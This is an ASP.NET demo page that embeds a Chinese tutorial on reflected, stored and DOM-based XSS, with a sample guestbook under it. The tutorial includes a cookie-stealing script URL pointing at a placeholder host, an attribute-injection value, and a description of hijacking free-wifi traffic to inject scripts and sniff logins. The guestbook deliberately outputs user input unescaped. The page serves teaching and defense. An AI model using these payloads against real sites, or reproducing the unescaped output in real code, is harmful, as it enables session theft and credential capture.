<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="XSS.aspx.cs" Inherits="XSSDemo.XSS" %>

<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <title></title>
    <script src="http://libs.baidu.com/jquery/1.9.1/jquery.min.js"></script>
</head>
<body>
<h1 class="postTitle" style="margin: 0px 0px 20px; padding: 0px; font-size: 28px; font-weight: 400; line-height: 1.8; color: rgb(51, 51, 51); font-family: Verdana, Arial, Helvetica, sans-serif; white-space: normal;">
    <a id="cb_post_title_url" class="postTitle2" href="http://undefined" style="margin: 0px; padding: 0px; color: rgb(51, 51, 51); text-decoration-line: none;">前端安全之XSS攻击</a>
</h1>
<div class="clear" style="margin: 0px; padding: 0px; clear: both; color: rgb(125, 139, 141); font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal;"></div>
<div class="postBody" style="margin: 0px; padding: 0px; color: rgb(125, 139, 141); font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal;">
    <div id="cnblogs_post_body" style="margin: 0px 0px 20px; padding: 0px; word-break: break-word; color: rgb(51, 51, 51); line-height: 1.8;">
        <p style="margin: 10px auto; padding: 0px;">
            <strong style="margin: 0px; padding: 0px;">XSS</strong>（cross-site scripting跨域脚本攻击）攻击是最常见的Web攻击，其重点是“跨域”和“客户端执行”。有人将XSS攻击分为三种，分别是：
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            1.&nbsp;Reflected XSS（基于反射的XSS攻击）
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            2.&nbsp;Stored XSS（基于存储的XSS攻击）
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            3.&nbsp;DOM-based or local XSS（基于DOM或本地的XSS攻击）
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            <span style="margin: 0px; padding: 0px; font-size: 14pt;"><strong style="margin: 0px; padding: 0px;"><span style="margin: 0px; padding: 0px; color: rgb(0, 0, 255);">Reflected XSS</span></strong></span>
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            基于反射的XSS攻击，主要依靠站点服务端返回脚本，在客户端触发执行从而发起Web攻击。
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            <strong style="margin: 0px; padding: 0px;"><span style="margin: 0px; padding: 0px; color: rgb(255, 102, 0);">例子：</span></strong>
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            1. 做个假设，当亚马逊在搜索书籍，搜不到书的时候显示提交的名称。
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            2. 在搜索框搜索内容，填入“&lt;script&gt;alert(&#39;handsome boy&#39;)&lt;/script&gt;”, 点击搜索。
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            3. 当前端页面没有对返回的数据进行过滤，直接显示在页面上， 这时就会alert那个字符串出来。
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            4. 进而可以构造获取用户cookies的地址，通过QQ群或者垃圾邮件，来让其他人点击这个地址：
        </p>
        <div class="cnblogs_code" style="margin: 5px 0px; padding: 5px; background-color: rgb(245, 245, 245); border: 1px solid rgb(204, 204, 204); overflow: auto; color: rgb(0, 0, 0); font-family: &quot;Courier New&quot; !important; font-size: 12px !important;">
            <pre style="margin-top: 0px; margin-bottom: 0px; padding: 0px; white-space: pre-wrap; word-wrap: break-word; font-family: &quot;Courier New&quot; !important;">http://www.amazon.cn/search?name=&lt;script&gt;document.location=&#39;http://xxx/get?cookie=&#39;+document.cookie&lt;/script&gt;</pre>
        </div>
        <p style="margin: 10px auto; padding: 0px;">
            PS：这个地址当然是没效的，只是举例子而已。
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            <strong style="margin: 0px; padding: 0px;"><span style="margin: 0px; padding: 0px; color: rgb(255, 102, 0);">结论：</span></strong>
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            如果只是1、2、3步做成功，那也只是自己折腾自己而已，如果第4步能做成功，才是个像样的XSS攻击。
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            <strong style="margin: 0px; padding: 0px;"><span style="margin: 0px; padding: 0px; color: rgb(255, 102, 0);">开发安全措施：</span></strong>
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            1. 前端在显示服务端数据时候，不仅是标签内容需要过滤、转义，就连属性值也都可能需要。
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            2. 后端接收请求时，验证请求是否为攻击请求，攻击则屏蔽。
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            例如：
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            标签：
        </p>
        <div class="cnblogs_code" style="margin: 5px 0px; padding: 5px; background-color: rgb(245, 245, 245); border: 1px solid rgb(204, 204, 204); overflow: auto; color: rgb(0, 0, 0); font-family: &quot;Courier New&quot; !important; font-size: 12px !important;">
            <pre style="margin-top: 0px; margin-bottom: 0px; padding: 0px; white-space: pre-wrap; word-wrap: break-word; font-family: &quot;Courier New&quot; !important;">&lt;span&gt;&lt;script&gt;alert(&#39;handsome boy&#39;)&lt;/script&gt;&lt;/span&gt;</pre>
        </div>
        <p style="margin: 10px auto; padding: 0px;">
            转义
        </p>
        <div class="cnblogs_code" style="margin: 5px 0px; padding: 5px; background-color: rgb(245, 245, 245); border: 1px solid rgb(204, 204, 204); overflow: auto; color: rgb(0, 0, 0); font-family: &quot;Courier New&quot; !important; font-size: 12px !important;">
            <pre style="margin-top: 0px; margin-bottom: 0px; padding: 0px; white-space: pre-wrap; word-wrap: break-word; font-family: &quot;Courier New&quot; !important;">&lt;span&gt;&amp;lt;script&amp;gt;alert(&amp;#39;handsome boy&amp;#39;)&amp;lt;/script&amp;gt&lt;/span&gt;</pre>
        </div>
        <p style="margin: 10px auto; padding: 0px;">
            属性：
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            如果一个input的value属性值是
        </p>
        <div class="cnblogs_code" style="margin: 5px 0px; padding: 5px; background-color: rgb(245, 245, 245); border: 1px solid rgb(204, 204, 204); overflow: auto; color: rgb(0, 0, 0); font-family: &quot;Courier New&quot; !important; font-size: 12px !important;">
            <pre style="margin-top: 0px; margin-bottom: 0px; padding: 0px; white-space: pre-wrap; word-wrap: break-word; font-family: &quot;Courier New&quot; !important;">琅琊榜&quot; onclick=&quot;javascript:alert(&#39;handsome boy&#39;)</pre>
        </div>
        <p style="margin: 10px auto; padding: 0px;">
            就可能出现
        </p>
        <div class="cnblogs_code" style="margin: 5px 0px; padding: 5px; background-color: rgb(245, 245, 245); border: 1px solid rgb(204, 204, 204); overflow: auto; color: rgb(0, 0, 0); font-family: &quot;Courier New&quot; !important; font-size: 12px !important;">
            <pre style="margin-top: 0px; margin-bottom: 0px; padding: 0px; white-space: pre-wrap; word-wrap: break-word; font-family: &quot;Courier New&quot; !important;">&lt;input type=&quot;text&quot; value=&quot;琅琊榜&quot; onclick=&quot;javascript:alert(&#39;handsome boy&#39;)&quot;&gt;</pre>
        </div>
        <p style="margin: 10px auto; padding: 0px;">
            点击input导致攻击脚本被执行，解决方式可以对script或者双引号进行过滤。
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            <span style="margin: 0px; padding: 0px; font-size: 14pt;"><strong style="margin: 0px; padding: 0px;"><span style="margin: 0px; padding: 0px; color: rgb(0, 0, 255);">Stored XSS</span></strong></span>
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            基于存储的XSS攻击，是通过发表带有恶意跨域脚本的帖子/文章，从而把恶意脚本存储在服务器，每个访问该帖子/文章的人就会触发执行。
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            <strong style="margin: 0px; padding: 0px;"><span style="margin: 0px; padding: 0px; color: rgb(255, 102, 0);">例子：</span></strong>
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            1. 发一篇文章，里面包含了恶意脚本
        </p>
        <div class="cnblogs_code" style="margin: 5px 0px; padding: 5px; background-color: rgb(245, 245, 245); border: 1px solid rgb(204, 204, 204); overflow: auto; color: rgb(0, 0, 0); font-family: &quot;Courier New&quot; !important; font-size: 12px !important;">
            <pre style="margin-top: 0px; margin-bottom: 0px; padding: 0px; white-space: pre-wrap; word-wrap: break-word; font-family: &quot;Courier New&quot; !important;">今天天气不错啊！&lt;script&gt;alert(&#39;handsome boy&#39;)&lt;/script&gt;</pre>
        </div>
        <p style="margin: 10px auto; padding: 0px;">
            2. 后端没有对文章进行过滤，直接保存文章内容到数据库。
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            3. 当其他看这篇文章的时候，包含的恶意脚本就会执行。
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            PS：因为大部分文章是保存整个HTML内容的，前端显示时候也不做过滤，就极可能出现这种情况。
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            <strong style="margin: 0px; padding: 0px;"><span style="margin: 0px; padding: 0px; color: rgb(255, 102, 0);">结论：</span></strong>
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            后端尽可能对提交数据做过滤，在场景需求而不过滤的情况下，前端就需要做些处理了。
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            <strong style="margin: 0px; padding: 0px;"><span style="margin: 0px; padding: 0px; color: rgb(255, 102, 0);">开发安全措施：</span></strong>
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            1. 首要是服务端要进行过滤，因为前端的校验可以被绕过。
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            2. 当服务端不校验时候，前端要以各种方式过滤里面可能的恶意脚本，例如script标签，将特殊字符转换成HTML编码。
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            <span style="margin: 0px; padding: 0px; font-size: 14pt;"><strong style="margin: 0px; padding: 0px;"><span style="margin: 0px; padding: 0px; color: rgb(0, 0, 255);">DOM-based or local XSS</span></strong></span>
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            基于DOM或本地的XSS攻击。一般是提供一个免费的wifi，但是提供免费wifi的网关会往你访问的任何页面插入一段脚本或者是直接返回一个钓鱼页面，从而植入恶意脚本。这种直接存在于页面，无须经过服务器返回就是基于本地的XSS攻击。
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            <strong style="margin: 0px; padding: 0px;"><span style="margin: 0px; padding: 0px; color: rgb(255, 102, 0);">例子1：</span></strong>
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            1.&nbsp;提供一个免费的wifi。
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            1. 开启一个特殊的DNS服务，将所有域名都解析到我们的电脑上，并把Wifi的DHCP-DNS设置为我们的电脑IP。
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            2. 之后连上wifi的用户打开任何网站，请求都将被我们截取到。我们根据http头中的host字段来转发到真正服务器上。
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            3. 收到服务器返回的数据之后，我们就可以实现网页脚本的注入，并返回给用户。
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            4.&nbsp;当注入的脚本被执行，用户的浏览器将依次预加载各大网站的常用脚本库。
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            <img src="http://images2015.cnblogs.com/blog/555379/201602/555379-20160218233441363-1334910770.png" alt="" style="margin: 0px; padding: 0px; border: none; max-width: 800px;"/>
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            PS：例子和图片来自，<a href="http://undefined" style="margin: 0px; padding: 0px; color: rgb(0, 0, 0);">http://www.cnblogs.com/index-html/p/wifi_hijack_3.html</a>&nbsp;<strong style="margin: 0px; padding: 0px;"><span style="margin: 0px; padding: 0px; color: rgb(255, 0, 0);">不是我写的，请注意！</span></strong>
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            这个其实就是wifi流量劫持，中间人可以看到用户的每一个请求，可以在页面嵌入恶意代码，使用恶意代码获取用户的信息，可以返回钓鱼页面。
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            <strong style="margin: 0px; padding: 0px;"><span style="margin: 0px; padding: 0px; color: rgb(255, 102, 0);">例子2：</span></strong>
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            1. 还是提供一个免费wifi
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            2. 在我们电脑上进行抓包
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            3.&nbsp;分析数据，可以获取用户的微信朋友圈、邮箱、社交网站帐号数据（HTTP）等。
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            <img src="http://images2015.cnblogs.com/blog/555379/201602/555379-20160218233450956-14270563.png" alt="" style="margin: 0px; padding: 0px; border: none; max-width: 800px;"/>
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            PS：这个是我的测试，在51job页面登录时进行抓包，可以获取帐号密码。
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            <strong style="margin: 0px; padding: 0px;"><span style="margin: 0px; padding: 0px; color: rgb(255, 102, 0);">结论：</span></strong>
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            这攻击其实跟网站本身没有什么关系，只是数据被中间人获取了而已，而由于HTTP是明文传输的，所以是极可能被窃取的。
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            <strong style="margin: 0px; padding: 0px;"><span style="margin: 0px; padding: 0px; color: rgb(255, 102, 0);">开发安全措施：</span></strong>
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            1. 使用HTTPS！就跟我前面《<a href="http://undefined" style="margin: 0px; padding: 0px; color: rgb(0, 0, 0);">HTTP与HTTPS握手的那些事</a>》这篇文章说的，HTTPS会在请求数据之前进行一次握手，使得客户端与服务端都有一个私钥，服务端用这个私钥加密，客户端用这个私钥解密，这样即使数据被人截取了，也是加密后的数据。
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            <span style="margin: 0px; padding: 0px; font-size: 14pt;"><strong style="margin: 0px; padding: 0px;"><span style="margin: 0px; padding: 0px; color: rgb(0, 0, 255);">总结</span></strong></span>
        </p>
        <p style="margin: 10px auto; padding: 0px;">
            XSS攻击的特点就是：尽一切办法在目标网站上执行非目标网站上原有的脚本（某篇文章说的）。本地的XSS攻击的示例2其实不算XSS攻击，只是简单流量劫持。前两种XSS攻击是我们开发时候要注意的，而流量劫持的则可以使用HTTPS提高安全性，
        </p>
    </div>
</div>
<p>
    <br/>
</p>

    <form id="form1" method="post">
        <div>
            用户名：<input type="text" name="username" /><br />
            <textarea name="content" style="width: 399px; height: 200px;"></textarea>
            <br />
            <br />
            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                    <input type="submit" value="提交留言" />
        </div>
    </form>
    <form id="form2" method="post">
        <div>
            用户名：<input type="text" name="username" /><br />
            <textarea name="content" style="width: 399px; height: 200px;"></textarea>
            <br />
            <br />
            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                    <input type="submit" value="提交留言" />
        </div>
    </form>
    <div>留言列表</div>
    <div>
        <% 
            foreach (var item in remark)
            {
                Response.Write("<p>" + item.Key + ":" + item.Value + "</p>");
            }
        %>
    </div>

    <script>


        $(function () {

            function htmlEncode(value) {
                return $('<div/>').text(value).html();
            }

            $('#form2').submit(function () {

                //用js转义html标签
                var encode = HtmlUtil.htmlEncode($('textarea[name=content]', this).val());
                //$(this).append('<input name="_content" value="' + encode + '">');

                $('textarea[name=content]', this).val(encode);
                
                //encode = htmlEncode($('textarea[name=content]', this).val());

                //$('textarea[name=content]', this).val(encode);
            });
        });

        var HtmlUtil = {
            /*1.用浏览器内部转换器实现html转码*/
            htmlEncode: function (html) {
                //1.首先动态创建一个容器标签元素，如DIV
                var temp = document.createElement("div");
                //2.然后将要转换的字符串设置为这个元素的innerText(ie支持)或者textContent(火狐，google支持)
                (temp.textContent != undefined) ? (temp.textContent = html) : (temp.innerText = html);
                //3.最后返回这个元素的innerHTML，即得到经过HTML编码转换的字符串了
                var output = temp.innerHTML;
                temp = null;
                return output;
            },
            /*2.用浏览器内部转换器实现html解码*/
            htmlDecode: function (text) {
                //1.首先动态创建一个容器标签元素，如DIV
                var temp = document.createElement("div");
                //2.然后将要转换的字符串设置为这个元素的innerHTML(ie，火狐，google都支持)
                temp.innerHTML = text;
                //3.最后返回这个元素的innerText(ie支持)或者textContent(火狐，google支持)，即得到经过HTML解码的字符串了。
                var output = temp.innerText || temp.textContent;
                temp = null;
                return output;
            },
            /*3.用正则表达式实现html转码*/
            htmlEncodeByRegExp: function (str) {
                var s = "";
                if (str.length == 0) return "";
                s = str.replace(/&/g, "&amp;");
                s = s.replace(/</g, "&lt;");
                s = s.replace(/>/g, "&gt;");
                s = s.replace(/ /g, "&nbsp;");
                s = s.replace(/\'/g, "&#39;");
                s = s.replace(/\"/g, "&quot;");
                return s;
            },
            /*4.用正则表达式实现html解码*/
            htmlDecodeByRegExp: function (str) {
                var s = "";
                if (str.length == 0) return "";
                s = str.replace(/&amp;/g, "&");
                s = s.replace(/&lt;/g, "<");
                s = s.replace(/&gt;/g, ">");
                s = s.replace(/&nbsp;/g, " ");
                s = s.replace(/&#39;/g, "\'");
                s = s.replace(/&quot;/g, "\"");
                return s;
            }
        };

    </script>
</body>
</html>
